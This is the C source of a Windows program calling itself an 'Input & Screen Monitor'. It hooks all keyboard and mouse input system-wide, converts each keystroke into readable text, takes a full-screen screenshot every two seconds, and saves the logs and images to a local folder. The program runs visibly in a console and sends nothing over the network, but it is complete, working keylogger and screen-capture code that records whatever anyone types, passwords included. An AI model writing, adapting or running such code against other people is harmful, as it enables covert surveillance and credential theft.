#include <windows.h>
#include <stdio.h>
#include <process.h>
#include <assert.h>
#include <stdlib.h>
#include <string.h>

/*
//
// Configuration & Globals
//
*/

#define SCREENSHOT_INTERVAL 2000 // ms
#define OUTPUT_FOLDER "output"
#define PATH_TO_LOG_FILE OUTPUT_FOLDER "/log.txt"
#define MAX_LOG_ENTRIES 512 // Max log entries in the ring buffer Must be power of 2!
#define MAX_MSG_LENGTH 256
volatile BOOL ACTIVE = TRUE;

/*
//
// Ring Buffer Implementation
*/

typedef struct
{
    char message[MAX_MSG_LENGTH];
} LogEntry_t;

typedef struct
{
    LogEntry_t *entries;
    size_t head;
    size_t tail;
    size_t count;
    CRITICAL_SECTION lock;
    HANDLE event;
} RingBuffer_t;

RingBuffer_t ringBuffer;

// Initialize ring buffer
void InitRingBuffer()
{
    ringBuffer.entries = (LogEntry_t *)malloc(MAX_LOG_ENTRIES * sizeof(LogEntry_t));
    ringBuffer.head = 0;
    ringBuffer.tail = 0;
    ringBuffer.count = 0;
    InitializeCriticalSection(&ringBuffer.lock);
    ringBuffer.event = CreateEvent(NULL, FALSE, FALSE, NULL);
}

// Enqueue log message
void EnqueueLog(const char *message)
{
    EnterCriticalSection(&ringBuffer.lock);
    if (ringBuffer.count < MAX_LOG_ENTRIES)
    {
        // Copying the msg into the preallocated entry
        strncpy(ringBuffer.entries[ringBuffer.head].message, message, MAX_MSG_LENGTH - 1);
        ringBuffer.entries[ringBuffer.head].message[MAX_MSG_LENGTH - 1] = '\0';

        ringBuffer.head = (ringBuffer.head + 1) & (MAX_LOG_ENTRIES - 1);
        ringBuffer.count++;

        SetEvent(ringBuffer.event);
    }

    LeaveCriticalSection(&ringBuffer.lock);
}

// Dequeue log message
BOOL DequeueLog(char *buffer)
{
    BOOL success = FALSE;
    EnterCriticalSection(&ringBuffer.lock);

    if (ringBuffer.count > 0)
    {

        strcpy(buffer, ringBuffer.entries[ringBuffer.tail].message);
        ringBuffer.tail = (ringBuffer.tail + 1) & (MAX_LOG_ENTRIES - 1);
        ringBuffer.count--;
        success = TRUE;
    }

    LeaveCriticalSection(&ringBuffer.lock);
    return success;
}

void DestroyRingBuffer()
{
    DeleteCriticalSection(&ringBuffer.lock);
    CloseHandle(ringBuffer.event);
    free(ringBuffer.entries);
}

/*
//
// Keyboard & Mouse Hooks
//
*/

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
    {
        KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;

        // Static flags to track modifier key state (first time pressed)
        static BOOL ctrlPressed = FALSE, shiftPressed = FALSE, altPressed = FALSE, winPressed = FALSE;
        static BOOL prevCtrlState = FALSE, prevShiftState = FALSE, prevAltState = FALSE, prevWinState = FALSE;

        // Check and update modifier states
        BOOL currentCtrlPressed = GetAsyncKeyState(VK_CONTROL) & KF_UP;
        BOOL currentShiftPressed = GetAsyncKeyState(VK_SHIFT) & KF_UP;
        BOOL currentAltPressed = GetAsyncKeyState(VK_MENU) & KF_UP;
        BOOL currentWinPressed = (GetAsyncKeyState(VK_LWIN) & KF_UP) || (GetAsyncKeyState(VK_RWIN) & KF_UP);

        // Only update state when there's a change
        if (currentCtrlPressed != prevCtrlState)
        {
            ctrlPressed = currentCtrlPressed;
            prevCtrlState = currentCtrlPressed;
        }
        if (currentShiftPressed != prevShiftState)
        {
            shiftPressed = currentShiftPressed;
            prevShiftState = currentShiftPressed;
        }
        if (currentAltPressed != prevAltState)
        {
            altPressed = currentAltPressed;
            prevAltState = currentAltPressed;
        }
        if (currentWinPressed != prevWinState)
        {
            winPressed = currentWinPressed;
            prevWinState = currentWinPressed;
        }

        // Prepare log message (start with modifiers)
        char logMessage[MAX_MSG_LENGTH] = {0};
        if (ctrlPressed)
            strcat(logMessage, "Ctrl + ");
        if (shiftPressed)
            strcat(logMessage, "Shift + ");
        if (altPressed)
            strcat(logMessage, "Alt + ");
        if (winPressed)
            strcat(logMessage, "Win + ");

        // Handle NumLock and ScrollLock (with GetAsyncKeyState)
        if (GetAsyncKeyState(VK_NUMLOCK) & KF_UP)
            strcat(logMessage, "NumLock + ");
        if (GetAsyncKeyState(VK_SCROLL) & KF_UP)
            strcat(logMessage, "ScrollLock + ");

        // Handle special cases (Backspace, Enter, Tab, etc.)
        switch (pKeyBoard->vkCode)
        {
        case VK_LWIN:
        case VK_RWIN:
            strcat(logMessage, "Windows");
            break;
        case VK_NUMLOCK:
            strcat(logMessage, "NumLock");
            break;
        case VK_APPS:
            strcat(logMessage, "Menu (Right-Click)");
            break;
        case VK_BACK:
            strcat(logMessage, "Backspace");
            break;
        case VK_RETURN:
            strcat(logMessage, "Enter");
            break;
        case VK_TAB:
            strcat(logMessage, "Tab");
            break;
        case VK_HOME:
            strcat(logMessage, "Home");
            break;
        case VK_INSERT:
            strcat(logMessage, "Insert");
            break;
        case VK_DELETE:
            strcat(logMessage, "Delete");
            break;
        case VK_END:
            strcat(logMessage, "End");
            break;
        case VK_PRIOR:
            strcat(logMessage, "Page Up");
            break;
        case VK_NEXT:
            strcat(logMessage, "Page Down");
            break;
        case VK_SNAPSHOT:
            strcat(logMessage, "PrintScreen");
            break;
        case VK_PAUSE:
            strcat(logMessage, "Pause/Break");
            break;
        case VK_LEFT:
            strcat(logMessage, "Left Arrow");
            break;
        case VK_RIGHT:
            strcat(logMessage, "Right Arrow");
            break;
        case VK_UP:
            strcat(logMessage, "Up Arrow");
            break;
        case VK_DOWN:
            strcat(logMessage, "Down Arrow");
            break;
        default:

            // Handle Numeric Keypad keys (VK_NUMPADx)
            if (pKeyBoard->vkCode >= VK_NUMPAD0 && pKeyBoard->vkCode <= VK_NUMPAD9)
            {
                char numKey[32];
                sprintf(numKey, "Num %d", pKeyBoard->vkCode - VK_NUMPAD0); // Map Num 0-9 to Num 0-9
                strcat(logMessage, numKey);
            }

            // Handle Function keys (F1-F12)
            else if (pKeyBoard->vkCode >= VK_F1 && pKeyBoard->vkCode <= VK_F12)
            {
                char fnKey[32];
                sprintf(fnKey, "F%d", pKeyBoard->vkCode - VK_F1 + 1);
                strcat(logMessage, fnKey);
            }
            else
            {
                // Handle regular key characters
                BYTE keyboardState[256] = {0};
                GetKeyboardState(keyboardState);

                wchar_t wideChar[2] = {0};
                UINT scanCode = MapVirtualKey(pKeyBoard->vkCode, MAPVK_VK_TO_VSC);
                scanCode <<= 16;

                int charCount = ToUnicode(pKeyBoard->vkCode, scanCode, keyboardState, wideChar, 2, 0);
                if (charCount > 0)
                {
                    char visualChar[4] = {0};
                    int bytesWritten = WideCharToMultiByte(CP_UTF8, 0, wideChar, -1, visualChar, sizeof(visualChar), NULL, NULL);
                    if (bytesWritten > 0)
                        strcat(logMessage, visualChar);
                    else
                        GetKeyNameText(scanCode, logMessage + strlen(logMessage), sizeof(logMessage) - strlen(logMessage));
                }
                else
                {
                    GetKeyNameText(scanCode, logMessage + strlen(logMessage), sizeof(logMessage) - strlen(logMessage));
                }
            }

            break;
        }

        EnqueueLog(logMessage);
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Mouse hook function
LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0)
    {
        MSLLHOOKSTRUCT *pMouse = (MSLLHOOKSTRUCT *)lParam;
        char logMessage[MAX_MSG_LENGTH];

        switch (wParam)
        {
        case WM_LBUTTONDOWN:
            snprintf(logMessage, sizeof(logMessage), "[Left Click: X=%d Y=%d]", pMouse->pt.x, pMouse->pt.y);
            break;
        case WM_RBUTTONDOWN:
            snprintf(logMessage, sizeof(logMessage), "[Right Click: X=%d Y=%d]", pMouse->pt.x, pMouse->pt.y);
            break;
        case WM_MOUSEWHEEL:
            snprintf(logMessage, sizeof(logMessage), "[Mouse Scroll]");
            break;
        default:
            return CallNextHookEx(NULL, nCode, wParam, lParam);
        }
        EnqueueLog(logMessage);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

/*
//
// Screenshot Capture
//
*/

// Function to take a screenshot. https://learn.microsoft.com/en-us/windows/win32/gdi/capturing-an-image
void TakeScreenshot(const char *filename)
{
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
    HGDIOBJ hOld = SelectObject(hdcMem, hBitmap);

    BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);

    BITMAP bmpScreen;
    GetObject(hBitmap, sizeof(BITMAP), &bmpScreen);

    BITMAPINFOHEADER bi;
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = bmpScreen.bmWidth;
    bi.biHeight = bmpScreen.bmHeight;
    bi.biPlanes = 1;
    bi.biBitCount = 16;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;

    DWORD dwBmpSize = ((bmpScreen.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmpScreen.bmHeight;

    char *lpbitmap = (char *)malloc(dwBmpSize);
    if (lpbitmap == NULL)
    {
        SelectObject(hdcMem, hOld);
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        return;
    }

    GetDIBits(hdcScreen, hBitmap, 0, (UINT)bmpScreen.bmHeight, lpbitmap, (BITMAPINFO *)&bi, DIB_RGB_COLORS);

    BITMAPFILEHEADER bf;
    bf.bfType = 0x4D42;
    bf.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER);
    bf.bfSize = bf.bfOffBits + dwBmpSize;

    HANDLE hFile = CreateFile(filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    DWORD dwBytesWritten = 0;
    WriteFile(hFile, (LPSTR)&bf, sizeof(BITMAPFILEHEADER), &dwBytesWritten, NULL);
    WriteFile(hFile, (LPSTR)&bi, sizeof(BITMAPINFOHEADER), &dwBytesWritten, NULL);
    WriteFile(hFile, (LPSTR)lpbitmap, dwBmpSize, &dwBytesWritten, NULL);

    CloseHandle(hFile);
    free(lpbitmap);
    SelectObject(hdcMem, hOld);
    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
}

/*
//
// Thread Functions
//
*/

// Screenshot thread function
unsigned __stdcall ScreenshotThread(void *arg)
{
    SYSTEMTIME lt;
    while (ACTIVE)
    {
        Sleep(SCREENSHOT_INTERVAL);
        char filename[MAX_PATH];
        GetLocalTime(&lt);
        snprintf(filename, sizeof(filename), "%s/screenshot_%04d_%02d_%02d_%02d%02d_%02d.bmp", OUTPUT_FOLDER, lt.wYear, lt.wMonth, lt.wDay, lt.wHour, lt.wMinute, lt.wSecond);
        TakeScreenshot(filename);
    }
    return 0;
}

// Logging thread function
unsigned __stdcall LogWriterThread(void *arg)
{
    char msg[MAX_MSG_LENGTH];
    while (ACTIVE)
    {
        WaitForSingleObject(ringBuffer.event, INFINITE);

        FILE *file = fopen(PATH_TO_LOG_FILE, "a");
        if (file)
        {
            while (DequeueLog(msg))
                fprintf(file, "%s\n", msg);

            fclose(file);
        }
    }
    return 0;
}

BOOL AlreadyRunning(void)
{
    HANDLE hMutex = CreateMutexA(NULL, TRUE, "mutex");

    if (GetLastError() == ERROR_ALREADY_EXISTS)
    {
        CloseHandle(hMutex);
        return TRUE;
    }
    else
        return FALSE;
}

/*
//
// Console / Process Management
//
*/

HANDLE cleanupFinished;
DWORD mainThreadId;

BOOL WINAPI ConsoleHandler(DWORD dwType)
{
    if (dwType == CTRL_C_EVENT || dwType == CTRL_BREAK_EVENT ||
        dwType == CTRL_CLOSE_EVENT || dwType == CTRL_LOGOFF_EVENT || dwType == CTRL_SHUTDOWN_EVENT)
    {
        ACTIVE = FALSE;

        PostThreadMessage(mainThreadId, WM_QUIT, 0, 0);

        WaitForSingleObject(cleanupFinished, 10000);

        return TRUE;
    }
    return FALSE;
}

void DisplayHeader()
{
    system("cls");
    printf("\033[1;32m");
    printf("======================================================\n");
    printf("\tWindows Input & Screen Monitor v1.0\n");
    printf("======================================================\n");
    printf(" Output: ./%s/\n", OUTPUT_FOLDER);
    printf(" Interval: %d ms\n", SCREENSHOT_INTERVAL);
    printf("======================================================\n");
    printf(" Press Ctrl+C or X in this window to exit safely.\n");
    printf("======================================================\n\n");
}

#ifdef RUN_TESTS
size_t GetRingBufferSize()
{
    size_t size;
    EnterCriticalSection(&ringBuffer.lock);
    size = ringBuffer.count;
    LeaveCriticalSection(&ringBuffer.lock);
    return size;
}

void TestRingBufferLogic()
{

    printf("Testing Ring Buffer Logic\n");

    InitRingBuffer();

    EnqueueLog("Message 1");
    EnqueueLog("Message 2");

    assert(GetRingBufferSize() == 2);

    char buffer[MAX_MSG_LENGTH];
    BOOL success1 = DequeueLog(buffer);
    assert(success1 == TRUE);
    assert(strcmp(buffer, "Message 1") == 0);

    BOOL success2 = DequeueLog(buffer);
    assert(success2 == TRUE);
    assert(strcmp(buffer, "Message 2") == 0);

    BOOL success3 = DequeueLog(buffer);
    assert(success3 == FALSE);

    assert(GetRingBufferSize() == 0);

    DestroyRingBuffer();
    printf("Success: Log Queue Logic Tests Passed!\n\n");
}

#define THREAD_COUNT 4
#define ITEMS_PER_THREAD MAX_LOG_ENTRIES / THREAD_COUNT

unsigned __stdcall HammerThread(void *arg)
{
    for (int i = 0; i < ITEMS_PER_THREAD; i++)
        EnqueueLog("Hammer Message");

    return 0;
}

void TestConcurrentQueue()
{
    InitRingBuffer();
    HANDLE threads[THREAD_COUNT];
    char buffer[MAX_MSG_LENGTH];

    printf("Testing Hammering Test with %d threads & total messages %d\n", THREAD_COUNT, (THREAD_COUNT * ITEMS_PER_THREAD));
    assert(GetRingBufferSize() == 0);

    for (int i = 0; i < THREAD_COUNT; i++)
        threads[i] = (HANDLE)_beginthreadex(NULL, 0, HammerThread, NULL, 0, NULL);

    WaitForMultipleObjects(THREAD_COUNT, threads, TRUE, INFINITE);
    assert(GetRingBufferSize() == (THREAD_COUNT * ITEMS_PER_THREAD));

    int count = 0;
    while (DequeueLog(buffer))
        count++;

    for (int i = 0; i < THREAD_COUNT; i++)
        CloseHandle(threads[i]);

    assert(count == (THREAD_COUNT * ITEMS_PER_THREAD));
    DestroyRingBuffer();
    printf("Success: Hammering Tests Passed!\n\n");
}
#endif

int main()
{

#ifdef RUN_TESTS
    TestRingBufferLogic();
    TestConcurrentQueue();
    Sleep(10000);
    return 0;
#endif

    assert((MAX_LOG_ENTRIES & (MAX_LOG_ENTRIES - 1)) == 0);

    mainThreadId = GetCurrentThreadId();
    cleanupFinished = CreateEvent(NULL, TRUE, FALSE, NULL);

    if (!SetConsoleCtrlHandler((PHANDLER_ROUTINE)ConsoleHandler, TRUE))
        return 1;

    if (AlreadyRunning())
    {
        MessageBoxA(NULL, "Already running", "Error!", MB_ICONERROR | MB_OK | MB_SETFOREGROUND);

        return 1;
    }

    if (!SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS))
    {
        MessageBoxA(NULL, "Failed to set process priority", "Error!", MB_ICONERROR | MB_OK);

        return 1;
    }

    if (!SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST))
    {
        MessageBoxA(NULL, "Failed to set thread priority", "Error!", MB_ICONERROR | MB_OK);

        return 1;
    }

    if (!CreateDirectory(OUTPUT_FOLDER, NULL) && GetLastError() != ERROR_ALREADY_EXISTS)
        return 1;

    DisplayHeader();
    InitRingBuffer();

    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    HHOOK mouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, GetModuleHandle(NULL), 0);

    _beginthread((void *)ScreenshotThread, 0, NULL);
    _beginthread((void *)LogWriterThread, 0, NULL);

    MSG msg;
    BOOL b;
    while ((b = GetMessage(&msg, NULL, 0, 0)) != 0)
    {
        if (b == -1)
            break;

        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    SetEvent(cleanupFinished);

    // Clean up
    DestroyRingBuffer();
    CloseHandle(cleanupFinished);
    UnhookWindowsHookEx(keyboardHook);
    UnhookWindowsHookEx(mouseHook);

    return 0;
}